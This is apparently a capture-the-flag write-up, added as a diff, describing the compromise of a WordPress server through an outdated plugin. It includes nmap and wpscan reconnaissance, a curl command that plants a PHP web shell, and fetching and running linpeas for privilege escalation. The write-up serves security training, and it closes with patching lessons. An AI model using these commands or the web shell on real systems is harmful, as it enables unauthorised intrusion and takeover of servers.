@@ -1,0 +1,46 @@
+#Objective:
+
+The goal of this challenge was to gain access to a vulnerable web server running an outdated WordPress plugin and escalate privileges on the system.
+Step 1: Initial Reconnaissance
+
+    Used nmap to scan the target IP for open ports.
+
+    bash
+
+    nmap -A -T4 <target_ip>
+
+        Discovered ports 80 (HTTP) and 22 (SSH) open.
+        HTTP server revealed a WordPress site running on the target machine.
+
+Step 2: Exploiting WordPress Plugin
+
+    Identified an outdated plugin using a WordPress vulnerability scanner (wpscan):
+
+    bash
+
+wpscan --url http://<target_ip> --enumerate p
+
+    The vulnerable plugin allowed for remote code execution (RCE).
+
+Used the discovered vulnerability to upload a reverse shell and execute it:
+
+bash
+
+    curl -X POST -d "cmd=echo '<?php system($_GET['cmd']); ?>' > shell.php" http://<target_ip>/wp-content/plugins/vulnerable_plugin/shell.php?cmd=id
+
+Step 3: Privilege Escalation
+
+    After gaining a low-privilege shell, enumerated the system for potential escalation vectors using linpeas.
+
+    bash
+
+    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+    chmod +x linpeas.sh
+    ./linpeas.sh
+
+    Found a kernel vulnerability that allowed for local privilege escalation and exploited it to gain root access.
+
+Lessons Learned:
+
+    Importance of regularly updating CMS platforms like WordPress.
+    Outdated plugins pose significant security risks, providing attackers with entry points.
